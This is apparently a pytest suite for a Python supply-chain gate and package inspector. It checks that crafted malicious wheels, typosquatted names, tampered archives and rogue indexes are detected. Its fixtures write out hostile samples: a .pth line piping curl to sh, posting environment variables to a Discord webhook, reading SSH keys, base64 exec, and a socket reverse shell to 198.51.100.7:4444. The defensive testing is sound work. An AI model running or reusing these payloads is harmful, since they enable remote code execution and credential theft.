"""security/supply_chain_gate.py and security/package_inspect.py, offline:
crafted malicious archives, a fake PyPI and OSV, typosquatted names, a
tampered venv, the gate configured for another project. Exported with the
gate (scripts/export_supply_chain_gate.py); axross's own use of it is held
by tests/test_supply_chain_gate_axross.py."""

from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import subprocess
import sys
import tarfile
import time
import zipfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from security import package_inspect as PI  # noqa: E402
from security import supply_chain_gate as G  # noqa: E402
from security.dep_floor_audit import LockedPin  # noqa: E402


# --- archives ---------------------------------------------------------------------------

def _record_line(name: str, data: bytes) -> str:
    digest = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()
    return f"{name},sha256={digest},{len(data)}"


def make_wheel(path: Path, members: dict[str, bytes], *, name="demo", version="1.0",
               tamper: dict[str, bytes] | None = None, unlisted: dict[str, bytes] | None = None) -> Path:
    info = f"{name}-{version}.dist-info"
    members = dict(members)
    members[f"{info}/METADATA"] = f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n".encode()
    record = [_record_line(n, d) for n, d in members.items()] + [f"{info}/RECORD,,"]
    with zipfile.ZipFile(path, "w") as zf:
        for n, d in members.items():
            zf.writestr(n, (tamper or {}).get(n, d))
        for n, d in (unlisted or {}).items():
            zf.writestr(n, d)
        zf.writestr(f"{info}/RECORD", "\n".join(record) + "\n")
    return path


def make_sdist(path: Path, members: dict[str, bytes]) -> Path:
    with tarfile.open(path, "w:gz") as tf:
        for n, d in members.items():
            info = tarfile.TarInfo(n)
            info.size = len(d)
            tf.addfile(info, io.BytesIO(d))
    return path


def rules(report: PI.Report) -> set[str]:
    return {f.rule for f in report.findings}


def test_happy_an_honest_wheel_has_no_findings(tmp_path):
    w = make_wheel(tmp_path / "demo-1.0-py3-none-any.whl", {"demo/__init__.py": b"def add(a, b):\n    return a + b\n"})
    report = PI.inspect(str(w))
    assert report.findings == [] and report.record_problems == [] and report.errors == []
    assert set(report.files) >= {"demo/__init__.py"} and report.kind == "wheel"


def test_sad_a_pth_that_runs_code_at_every_start_is_found(tmp_path):
    w = make_wheel(tmp_path / "x-1.0-py3-none-any.whl",
                   {"evil.pth": b"import os; os.system('curl http://198.51.100.7/x | sh')\n", "x/__init__.py": b""})
    report = PI.inspect(str(w))
    assert "pth-executes-at-start" in rules(report)
    assert report.pth == {"evil.pth": ["import os; os.system('curl http://198.51.100.7/x | sh')"]}


def test_sad_obfuscated_exec_and_exfiltration_are_found(tmp_path):
    code = (b"import base64, os, requests\n"
            b"exec(base64.b64decode('cHJpbnQoMSk='))\n"
            b"requests.post('https://discord.com/api/webhooks/1/abc', data=str(os.environ))\n"
            b"key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
            b"blob = '" + b"A" * 3000 + b"'\n")
    report = PI.inspect(str(make_wheel(tmp_path / "x-1.0-py3-none-any.whl", {"x/__init__.py": code})))
    assert {"exec-decoded", "discord-telegram-webhook", "secret-paths", "env-dump", "encoded-blob"} <= rules(report)
    assert all(f.severity in ("high", "medium") for f in report.findings)


def test_sad_a_member_changed_after_the_build_breaks_the_record(tmp_path):
    w = make_wheel(tmp_path / "x-1.0-py3-none-any.whl", {"x/a.py": b"ok = 1\n"},
                   tamper={"x/a.py": b"ok = 2\n"}, unlisted={"x/extra.py": b"pass\n"})
    problems = PI.inspect(str(w)).record_problems
    assert any("x/a.py does not match" in p for p in problems)
    assert any("x/extra.py is in the wheel but not in RECORD" in p for p in problems)


def test_sad_a_member_that_leaves_the_archive_is_refused(tmp_path):
    path = tmp_path / "x-1.0.tar.gz"
    make_sdist(path, {"x-1.0/setup.py": b"from setuptools import setup\nsetup()\n", "../../etc/evil": b"x"})
    report = PI.inspect(str(path))
    assert any("unsafe member path" in e for e in report.errors)


def test_sad_network_in_a_build_hook_counts_high(tmp_path):
    path = make_sdist(tmp_path / "x-1.0.tar.gz", {
        "x-1.0/setup.py": b"import urllib.request\nurllib.request.urlopen('https://example.org/p')\n"})
    report = PI.inspect(str(path))
    assert any(f.rule == "setup-network" and f.severity == "high" for f in report.findings)
    assert report.hooks == ["x-1.0/setup.py"]


def test_happy_finding_keys_survive_a_moved_line():
    a = PI.Finding("exec-decoded", "high", "x.py", 10, "exec(b64decode(s))")
    b = PI.Finding("exec-decoded", "high", "x.py", 99, "exec(b64decode(s))")
    assert a.key() == b.key()


# --- names ------------------------------------------------------------------------------

TOP = ["requests", "urllib3", "python-dateutil", "colorama", "django", "cryptography", "lxml", "boto3",
       "numpy", "pyyaml", "setuptools", "requests-toolbelt"]


@pytest.mark.parametrize("name,squat", [
    ("reqeusts", "requests"), ("urlib3", "urllib3"), ("python-dateutils", "python-dateutil"),
    ("colorsama", "colorama"), ("djanga", "django"), ("crypt0graphy", "cryptography"), ("1xml", "lxml"),
    ("boto-3", "boto3"), ("pyyaml-dev", "pyyaml"), ("numpy-utils", "numpy"), ("python-requests", "requests"),
    ("requests_toolbelt2", "requests-toolbelt"),
])
def test_sad_typosquats_are_named(name, squat):
    assert G.typosquat_of(name, TOP) == squat


@pytest.mark.parametrize("name", ["requests", "Requests", "slixmpp", "matrix-nio", "vodozemac", "bumble", "attrs"])
def test_happy_real_names_are_no_squats(name):
    assert G.typosquat_of(name, TOP) is None


def test_edge_names_the_mirror_s_leak_check_would_flag_are_left_out(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "_scrub_rules.py").write_text(
        "def find_leaks(text, include_paths=True):\n    return ['marker'] if 'flagged' in text else []\n")
    assert G.publishable_names(["requests", "a-flagged-name", "six"], tmp_path) == (["requests", "six"], 1)
    assert G.publishable_names(["a-flagged-name"], tmp_path / "elsewhere") == (["a-flagged-name"], 0)


def test_sad_non_ascii_names_are_suspect():
    assert G.typosquat_of("requ\u0435sts", TOP)        # a Cyrillic e


def test_happy_the_committed_top_list_is_there_and_ordered():
    top = G.load_top_packages()
    assert len(top) >= 10_000 and top.index("requests") < 100


def test_sad_an_extra_index_is_a_problem(tmp_path, monkeypatch):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "build_dist.sh").write_text(
        "pip install --index-url https://pypi.org/simple x\npip install --extra-index-url https://evil.example/simple y\n")
    problems = G.index_problems(tmp_path)
    assert len(problems) == 1 and "evil.example" in problems[0]
    monkeypatch.setenv("PIP_EXTRA_INDEX_URL", "https://other.example/simple")
    assert any("PIP_EXTRA_INDEX_URL" in p for p in G.index_problems(tmp_path))


# --- check_pin against a fake PyPI -------------------------------------------------------------

class FakePypi:
    def __init__(self, tmp_path: Path, wheel: Path, *, age_days=30, yanked=False, publisher=None):
        self.wheel = wheel
        digest = hashlib.sha256(wheel.read_bytes()).hexdigest()
        uploaded = time.strftime("%Y-%m-%dT%H:%M:%S.000000Z", time.gmtime(time.time() - age_days * 86400))
        self.file = {"filename": wheel.name, "digests": {"sha256": digest}, "packagetype": "bdist_wheel",
                     "url": f"https://files.pythonhosted.org/x/{wheel.name}", "upload_time_iso_8601": uploaded,
                     "yanked": yanked}
        self.release = {"info": {"name": "demo", "version": "1.0", "yanked": False, "summary": "demo"},
                        "urls": [self.file]}
        self.publisher = publisher

    def install(self, monkeypatch):
        monkeypatch.setattr(G, "pypi_release", lambda name, version: self.release)
        monkeypatch.setattr(G, "provenance_raw", lambda n, v, f: self.publisher)
        monkeypatch.setattr(G, "download", lambda url, sha, fn: self.wheel)
        return self

    def pin(self, hashes=None) -> LockedPin:
        return LockedPin("demo", "1.0", "", tuple(hashes or [self.file["digests"]["sha256"]]))


@pytest.fixture
def baseline_dir(tmp_path, monkeypatch):
    d = tmp_path / "baseline"
    monkeypatch.setattr(G, "BASELINE_DIR", d)
    return d


def honest_wheel(tmp_path) -> Path:
    return make_wheel(tmp_path / "demo-1.0-py3-none-any.whl", {"demo/__init__.py": b"x = 1\n"})


def problems_of(result) -> list[str]:
    return [p.check for p in result.problems]


def write_baseline(result, baseline_dir, **kw):
    entry = G.baseline_entry(result, "test", "reviewed in the test", **kw)
    G.save_baseline(entry)
    return entry


def test_happy_a_reviewed_unchanged_pin_passes(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path)).install(monkeypatch)
    first = G.check_pin("lock", pypi.pin(), ["linux-x86_64"])
    assert problems_of(first) == ["baseline"]            # never reviewed
    write_baseline(first, baseline_dir)
    assert G.check_pin("lock", pypi.pin(), ["linux-x86_64"]).problems == []


def test_sad_a_hash_that_is_no_pypi_file_fails(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path)).install(monkeypatch)
    result = G.check_pin("lock", pypi.pin(hashes=["0" * 64, pypi.file["digests"]["sha256"]]), ["linux-x86_64"])
    assert "pypi" in problems_of(result)


def test_sad_yanked_and_young_releases_fail(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path), age_days=2, yanked=True).install(monkeypatch)
    checks = problems_of(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]))
    assert "age" in checks and checks.count("pypi") >= 1


def test_happy_a_young_release_passes_with_a_reviewed_reason(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path), age_days=2).install(monkeypatch)
    result = G.check_pin("lock", pypi.pin(), ["linux-x86_64"])
    write_baseline(result, baseline_dir, young="fixes CVE-2026-1")
    assert G.check_pin("lock", pypi.pin(), ["linux-x86_64"]).problems == []


def test_sad_a_new_version_needs_a_new_review(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path)).install(monkeypatch)
    result = G.check_pin("lock", pypi.pin(), ["linux-x86_64"])
    entry = G.baseline_entry(result, "test", "reviewed in the test")
    entry["version"] = "0.9"
    G.save_baseline(entry)
    result = G.check_pin("lock", pypi.pin(), ["linux-x86_64"])
    assert any("version changed from the reviewed 0.9" in p.message for p in result.problems)


def test_happy_two_locked_versions_of_one_package_each_keep_their_review(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path)).install(monkeypatch)
    entry = write_baseline(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]), baseline_dir)
    other = dict(entry, version="2.0")
    G.save_baseline(other)
    assert G.reviewed_versions("demo") == ["1.0", "2.0"]
    assert G.check_pin("lock", pypi.pin(), ["linux-x86_64"]).problems == []
    G.save_baseline(other, locked={("demo", "2.0")})     # 1.0 left the locks
    assert G.reviewed_versions("demo") == ["2.0"]


def test_sad_a_reuploaded_or_altered_archive_fails(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path)).install(monkeypatch)
    write_baseline(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]), baseline_dir)
    (tmp_path / "evil").mkdir()
    evil = make_wheel(tmp_path / "evil" / "demo-1.0-py3-none-any.whl",
                      {"demo/__init__.py": b"x = 1\n", "demo.pth": b"import demo_payload\n"})
    monkeypatch.setattr(G, "download", lambda url, sha, fn: evil)
    messages = [p.message for p in G.check_pin("lock", pypi.pin(), ["linux-x86_64"]).problems]
    assert any("not the file that was reviewed" in m for m in messages)
    assert any("members differ" in m for m in messages)
    assert any("pth-executes-at-start" in m for m in messages)


def test_sad_a_new_publisher_or_lost_attestations_fail(tmp_path, monkeypatch, baseline_dir):
    att = {"attestation_bundles": [{"publisher": {"kind": "GitHub", "repository": "org/demo",
                                                  "workflow": "release.yml"}, "attestations": []}]}
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path), publisher=att).install(monkeypatch)
    write_baseline(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]), baseline_dir)
    pypi.publisher = {"attestation_bundles": [{"publisher": {"kind": "GitHub", "repository": "attacker/demo",
                                                             "workflow": "release.yml"}, "attestations": []}]}
    assert "provenance" in problems_of(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]))
    pypi.publisher = None
    assert "provenance" in problems_of(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]))


def test_sad_osv_malicious_entries_and_advisories_fail(tmp_path, monkeypatch, baseline_dir):
    (tmp_path / "build").mkdir()
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path)).install(monkeypatch)
    h = pypi.file["digests"]["sha256"]
    (tmp_path / "build" / "requirements-scan-tools.txt").write_text(f"demo==1.0 \\\n    --hash=sha256:{h}\n")
    results, general = G.run_check(["linux-x86_64"], root=tmp_path, top=TOP,
                                   osv=lambda pairs: [["MAL-2026-1234", "GHSA-xxxx"]])
    assert any(p.check == "osv" and "MALICIOUS" in p.message for p in general)


def test_sad_osv_unreachable_does_not_pass(monkeypatch):
    import urllib.error

    monkeypatch.setattr(G.urllib.request, "urlopen", lambda *a, **k: (_ for _ in ()).throw(urllib.error.URLError("down")))
    with pytest.raises(G.GateError):
        G.osv_batch([("requests", "2.0")])


def test_sad_the_scanner_lock_must_exist(tmp_path):
    (tmp_path / "build").mkdir()
    with pytest.raises(G.GateError):
        G.read_locks(tmp_path)


def test_happy_platform_wheels_are_chosen_over_others():
    files = [{"filename": n, "digests": {"sha256": n}, "packagetype": "bdist_wheel" if n.endswith(".whl") else "sdist"}
             for n in ("a-1-cp312-cp312-manylinux_2_17_x86_64.whl", "a-1-cp312-cp312-win_amd64.whl",
                       "a-1-cp311-cp311-manylinux_2_17_x86_64.whl", "a-1-cp39-abi3-macosx_11_0_arm64.whl", "a-1.tar.gz")]
    chosen = G.files_for(files, {f["filename"] for f in files}, ["linux-x86_64"])
    assert [f["filename"] for f in chosen] == ["a-1-cp312-cp312-manylinux_2_17_x86_64.whl"]
    chosen = G.files_for(files, {f["filename"] for f in files}, ["macos-arm64"])
    assert [f["filename"] for f in chosen] == ["a-1-cp39-abi3-macosx_11_0_arm64.whl"]
    only_sdist = [files[-1]]
    assert G.files_for(only_sdist, {"a-1.tar.gz"}, ["linux-x86_64"]) == only_sdist


def test_sad_a_download_from_elsewhere_is_refused(tmp_path, monkeypatch):
    monkeypatch.setattr(G, "CACHE_DIR", tmp_path)
    with pytest.raises(G.GateError):
        G.download("https://evil.example/x.whl", "0" * 64, "x.whl")
    monkeypatch.setattr(G, "_get", lambda *a, **k: b"not the locked content")
    with pytest.raises(G.GateError):
        G.download("https://files.pythonhosted.org/x.whl", "0" * 64, "x.whl")


def _capa_source_tarball(tmp_path: Path) -> bytes:
    members = {f"capa-10.0.0/sigs/{i}_flare.sig": b"FLIRT" for i in (1, 2, 3)}
    members["capa-10.0.0/sigs/README.md"] = b"not a signature"
    members["capa-10.0.0/capa/main.py"] = b"print('not unpacked')"
    members["capa-10.0.0/sigs/../../escape.sig"] = b"outside"
    return make_sdist(tmp_path / "capa.tar.gz", members).read_bytes()


def test_happy_capa_gets_its_pinned_signatures_and_nothing_else(tmp_path, monkeypatch):
    data = _capa_source_tarball(tmp_path)
    pin = tmp_path / "capa-sigs.txt"
    pin.write_text(f"# comment\nhttps://github.com/mandiant/capa/archive/v.tar.gz {hashlib.sha256(data).hexdigest()}\n")
    monkeypatch.setattr(G, "CACHE_DIR", tmp_path / "cache")
    monkeypatch.setattr(G, "CAPA_SIGS_FILE", pin)
    monkeypatch.setattr(G, "_get", lambda *a, **k: data)
    sigs = Path(G.capa_sigs())
    assert sigs.name == "sigs"
    assert sorted(p.name for p in sigs.iterdir()) == ["1_flare.sig", "2_flare.sig", "3_flare.sig"]
    unpacked = {str(p.relative_to(tmp_path / "cache")) for p in (tmp_path / "cache").rglob("*") if p.is_file()}
    assert not any("main.py" in u or "README" in u or "escape" in u for u in unpacked)
    monkeypatch.setattr(G, "_get", lambda *a, **k: pytest.fail("downloaded twice"))
    assert G.capa_sigs() == str(sigs)


def test_sad_capa_signatures_with_another_hash_or_from_elsewhere_are_refused(tmp_path, monkeypatch):
    data = _capa_source_tarball(tmp_path)
    pin = tmp_path / "capa-sigs.txt"
    monkeypatch.setattr(G, "CACHE_DIR", tmp_path / "cache")
    monkeypatch.setattr(G, "CAPA_SIGS_FILE", pin)
    monkeypatch.setattr(G, "_get", lambda *a, **k: data)
    pin.write_text(f"https://github.com/mandiant/capa/archive/v.tar.gz {'0' * 64}\n")
    with pytest.raises(G.GateError, match="pinned hash"):
        G.capa_sigs()
    pin.write_text(f"https://evil.example/capa.tar.gz {hashlib.sha256(data).hexdigest()}\n")
    with pytest.raises(G.GateError, match="not github.com"):
        G.capa_sigs()


def test_happy_capa_is_given_the_signatures(tmp_path, monkeypatch):
    """Without -s capa refuses every PE file (the wheel carries no signatures)."""
    from security import supply_chain_scan as SC

    seen = []

    def run(cmd, **kwargs):
        seen.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout=b'{"rules": {"x": {}}}', stderr=b"")
    monkeypatch.setattr(SC.subprocess, "run", run)
    monkeypatch.setattr(SC, "SIGS", "/sigs")
    assert SC._capa_one("capa", "/rules", "/sample", {})["capabilities"] == ["x"]
    assert seen[0][seen[0].index("-s") + 1] == "/sigs"
    import inspect

    source = inspect.getsource(G.deep_scan)   # the night scan's capa child too
    assert '"-r", rules, "-s", sigs, path' in source and "str(remaining), sigs]" in source


@pytest.mark.parametrize("rc,ok", [(17, True), (16, True), (14, True), (18, True), (1, False), (-9, False)])
def test_edge_a_file_capa_cannot_analyse_is_skipped_with_the_reason_not_an_error(monkeypatch, rc, ok):
    """capa analyses x86 / x86-64 only: an ARM64 launcher (pip, setuptools)
    exits 17 - recorded as skipped, while a crash or a kill stays an error
    (accept-survey refuses pins with capa errors)."""
    from security import supply_chain_scan as SC

    monkeypatch.setattr(SC.subprocess, "run",
                        lambda cmd, **kw: subprocess.CompletedProcess(cmd, rc, stdout=b"", stderr=b"boom"))
    entry = SC._capa_one("capa", "/rules", "/sample", {})
    if ok:
        assert "error" not in entry and "capabilities" not in entry
        assert entry["skipped"].startswith("capa: ")
    else:
        assert entry["error"] == "boom"


def test_edge_capa_out_of_memory_is_left_to_the_night_scan(monkeypatch):
    from security import supply_chain_scan as SC

    monkeypatch.setattr(SC.subprocess, "run", lambda cmd, **kw: subprocess.CompletedProcess(
        cmd, 1, stdout=b"", stderr=b"Unexpected exception raised: <class 'MemoryError'>"))
    entry = SC._capa_one("capa", "/rules", "/sample", {})
    assert "error" not in entry and "capabilities" not in entry
    assert "night scan" in entry["skipped"]


def test_edge_credential_shaped_strings_of_a_binary_stay_out_of_the_baseline():
    from security import supply_chain_gate as G

    key = "sk-ant-" + "A1b2C3d4E5f6G7h8I9j0"
    profile = {"urls": ["https://example.org/a-bitma" + "sk" + "-improvement-to-something-long/", f"x{key}/y"],
               "categories": {"network": ["connect"]}, "size": 3}
    out = G.withhold_credentials(profile)
    assert key not in json.dumps(out)
    assert out["urls"][1].startswith("x[withheld sha256:") and out["urls"][1].endswith("]/y")
    assert "withheld" in out["urls"][0]                 # the shape alone decides, as in the export
    assert out["categories"] == profile["categories"] and out["size"] == 3
    assert G.withhold_credentials(out) == out           # stable: a re-review compares equal


# --- system packages ------------------------------------------------------------------------

def test_sad_a_fixable_system_advisory_fails_an_unfixed_one_is_noted(tmp_path, monkeypatch, baseline_dir):
    data = {"system": "debian12", "ecosystem": "Debian:12", "packages": [
        {"name": "libssl3", "version": "3.0.1-1", "source": "openssl", "source_version": "3.0.1-1",
         "sha256": "a" * 64, "file": "libssl3.deb"},
        {"name": "libxml2", "version": "2.9-1", "source": "libxml2", "source_version": "2.9-1",
         "sha256": "b" * 64, "file": "libxml2.deb"}]}
    path = tmp_path / "PACKAGES.json"
    path.write_text(json.dumps(data))
    osv = lambda keys: [["DSA-1"] if k[1] == "openssl" else ["CVE-2"] for k in keys]  # noqa: E731
    problems, notes = G.check_system(path, osv=osv, fixed=lambda vid, eco, name: vid == "DSA-1")
    assert [p.package for p in problems] == ["debian12:openssl"]
    assert any("CVE-2" in n for n in notes)
    monkeypatch.setattr(G, "BASELINE_DIR", baseline_dir)
    G.accept_system(path)
    data["packages"][1]["sha256"] = "c" * 64
    path.write_text(json.dumps(data))
    problems, _ = G.check_system(path, osv=lambda keys: [[] for _ in keys], fixed=lambda *a: False)
    assert any("same version, other content" in p.message for p in problems)


def test_edge_a_fix_only_a_later_release_has_is_no_fix_this_release_lacks(monkeypatch):
    # DEBIAN-CVE-2023-1972 (binutils) as OSV has it: fixed in Debian 13 and 14, not in 12
    record = {"affected": [
        {"package": {"ecosystem": "Debian:12", "name": "binutils"},
         "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}]},
        {"package": {"ecosystem": "Debian:13", "name": "binutils"},
         "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.41-1"}]}]}]}
    monkeypatch.setattr(G, "_get_json", lambda url: record)
    assert G.osv_fixed("DEBIAN-CVE-2023-1972", "Debian:12", "binutils") is False
    assert G.osv_fixed("DEBIAN-CVE-2023-1972", "Debian:13", "binutils") is True
    assert G.osv_fixed("DEBIAN-CVE-2023-1972", "Debian:13", "binutils-dev") is False


# --- an installed venv -----------------------------------------------------------------------------

def test_sad_a_venv_with_an_unlocked_or_altered_package_fails(tmp_path):
    venv = tmp_path / "venv"
    subprocess.run([sys.executable, "-m", "venv", "--without-pip", str(venv)], check=True)
    site = next(venv.glob("lib/python*/site-packages"))
    (site / "demo").mkdir()
    code = b"x = 1\n"
    (site / "demo" / "__init__.py").write_bytes(code)
    info = site / "demo-1.0.dist-info"
    info.mkdir()
    (info / "METADATA").write_text("Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n")
    (info / "RECORD").write_text(_record_line("demo/__init__.py", code) + "\ndemo-1.0.dist-info/RECORD,,\n")
    python = str(venv / "bin" / "python")
    lock = tmp_path / "lock.txt"
    lock.write_text("demo==1.0 \\\n    --hash=sha256:" + "a" * 64 + "\n")
    assert G.verify_env(python, [lock]) == []
    (site / "demo" / "__init__.py").write_bytes(b"import payload\n")
    assert [p.check for p in G.verify_env(python, [lock])] == ["env"]
    lock.write_text("other==1.0 \\\n    --hash=sha256:" + "a" * 64 + "\n")
    assert any("in no lock" in p.message for p in G.verify_env(python, [lock]))


# --- the scanners (only with AXROSS_TEST_SCAN_PYTHON: the scanner venv) --------------------------

@pytest.mark.skipif(not os.environ.get("AXROSS_TEST_SCAN_PYTHON"), reason="AXROSS_TEST_SCAN_PYTHON not set")
def test_happy_the_scanners_find_a_malicious_package(tmp_path):
    code = (b"import base64, os, socket, subprocess\n"
            b"exec(base64.b64decode('aW1wb3J0IG9z'))\n"
            b"s=socket.socket();s.connect(('198.51.100.7',4444));os.dup2(s.fileno(),0)\n"
            b"subprocess.call(['/bin/sh','-i'])\n")
    w = make_wheel(tmp_path / "evil-1.0-py3-none-any.whl", {"evil/__init__.py": code})
    job, out = tmp_path / "job.json", tmp_path / "out.json"
    job.write_text(json.dumps({"archives": [{"path": str(w), "name": w.name, "provenance": None}],
                               "known_native": [], "skip_capa": True}))
    subprocess.run([os.environ["AXROSS_TEST_SCAN_PYTHON"], "-I", str(G.SCANNER),
                    str(job), str(out)], check=True, timeout=300)
    hits = json.loads(out.read_text())["archives"][w.name]["yara"]
    threats = {h["rule"].split(":")[-1] for h in hits if h["kind"] == "threat"}
    assert "threat_runtime_obfuscation_base64exec" in threats
    assert any("reverse_shell" in t for t in threats)  # axross_reverse_shell_dup2


def test_happy_build_from_source_packages_have_their_sdist_reviewed():
    files = [{"filename": "pyinstaller-1.tar.gz", "digests": {"sha256": "a"}, "packagetype": "sdist"},
             {"filename": "pyinstaller-1-py3-none-manylinux2014_x86_64.whl", "digests": {"sha256": "b"},
              "packagetype": "bdist_wheel"}]
    names = [f["filename"] for f in G.files_for(files, {"a", "b"}, ["linux-x86_64"], with_sdist=True)]
    assert names == ["pyinstaller-1.tar.gz", "pyinstaller-1-py3-none-manylinux2014_x86_64.whl"]


def test_sad_a_deep_scan_alarm_fails_until_it_is_reviewed(tmp_path, monkeypatch, baseline_dir):
    pypi = FakePypi(tmp_path, honest_wheel(tmp_path)).install(monkeypatch)
    entry = write_baseline(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]), baseline_dir)
    entry["scans"] = {"capa": {"f" * 64: {"path": "demo/_x.so", "capabilities": ["check for debugger"],
                                          "alarms": ["anti-analysis/check for debugger"]}}}
    G.save_baseline(entry)
    monkeypatch.setattr(G, "read_locks", lambda root=None, locks=None: [("lock", pypi.pin())])
    assert [p.check for p in G.deep_problems()] == ["capa"]
    with pytest.raises(G.GateError):
        G.accept_deep("demo==1.0", "demo/_x.so", "short", "test")
    G.accept_deep("demo==1.0", "demo/_x.so", "the debugger check is the library's own crash handler", "test")
    assert G.deep_problems() == []


def test_happy_deep_pending_lists_binaries_without_a_full_analysis(tmp_path, monkeypatch, baseline_dir):
    so = b"\x7fELF" + b"\x00" * 60
    w = make_wheel(tmp_path / "demo-1.0-py3-none-any.whl", {"demo/__init__.py": b"", "demo/_x.so": so})
    pypi = FakePypi(tmp_path, w).install(monkeypatch)
    write_baseline(G.check_pin("lock", pypi.pin(), ["linux-x86_64"]), baseline_dir)
    monkeypatch.setattr(G, "read_locks", lambda root=None, locks=None: [("lock", pypi.pin())])
    assert [p[3] for p in G.deep_pending()] == ["demo/_x.so"]


# --- the gate for another project ----------------------------------------------------------------

def _project(tmp_path: Path, extra: str = "") -> Path:
    (tmp_path / "proj").mkdir()
    (tmp_path / "proj" / "requirements.txt").write_text(
        "six==1.17.0 \\\n    --hash=sha256:" + "a" * 64 + "\n", encoding="utf-8")
    (tmp_path / "proj" / "pyproject.toml").write_text("[project]\nname = 'p'\n", encoding="utf-8")
    config = tmp_path / "proj" / "supply-chain-gate.toml"
    config.write_text('locks = ["requirements.txt"]\nindex_config = ["pyproject.toml"]\n'
                      'baseline_dir = "baseline"\nmin_age_days = 7\nuser_agent = "p-gate/1"\n' + extra,
                      encoding="utf-8")
    return config


@pytest.fixture
def restore_config():
    keys = ("ROOT", "LOCKS", "INDEX_CONFIG", "BASELINE_DIR", "CACHE_DIR", "TOP_PACKAGES", "YOUNG_FILE",
            "FROM_SOURCE_FILE", "CAPA_RULES_FILE", "CAPA_SIGS_FILE", "MIN_AGE_DAYS", "USER_AGENT")
    saved = {k: getattr(G, k) for k in keys}
    yield
    for k, v in saved.items():
        setattr(G, k, v)


def test_happy_a_config_points_the_gate_at_another_project(tmp_path, restore_config, monkeypatch):
    monkeypatch.delenv("AXROSS_SUPPLY_CHAIN_CACHE", raising=False)
    config = _project(tmp_path)
    G.configure(config)
    proj = config.parent.resolve()
    assert G.ROOT == proj and G.BASELINE_DIR == proj / "baseline" and G.CACHE_DIR == proj / ".supply-chain-cache"
    assert G.MIN_AGE_DAYS == 7 and G.USER_AGENT == "p-gate/1" and G.TOP_PACKAGES.is_file()
    assert [(rel, p.name, p.version) for rel, p in G.read_locks()] == [("requirements.txt", "six", "1.17.0")]
    assert G.index_problems() == []


def test_happy_status_with_a_config_lists_the_unreviewed_pins(tmp_path, restore_config, capsys):
    config = _project(tmp_path)
    assert G.main(["--config", str(config), "status"]) == 0
    line = next(l for l in capsys.readouterr().out.splitlines() if l.startswith("six "))
    assert line.split()[1:] == ["1.17.0", "not", "reviewed"]


def test_sad_a_config_with_an_unknown_setting_or_no_lock_does_not_run(tmp_path, restore_config, capsys):
    config = _project(tmp_path, 'baseline = "typo"\n')
    assert G.main(["--config", str(config), "status"]) == 2
    assert "unknown settings baseline" in capsys.readouterr().err
    config.write_text("locks = []\n", encoding="utf-8")
    assert G.main(["--config", str(config), "status"]) == 2
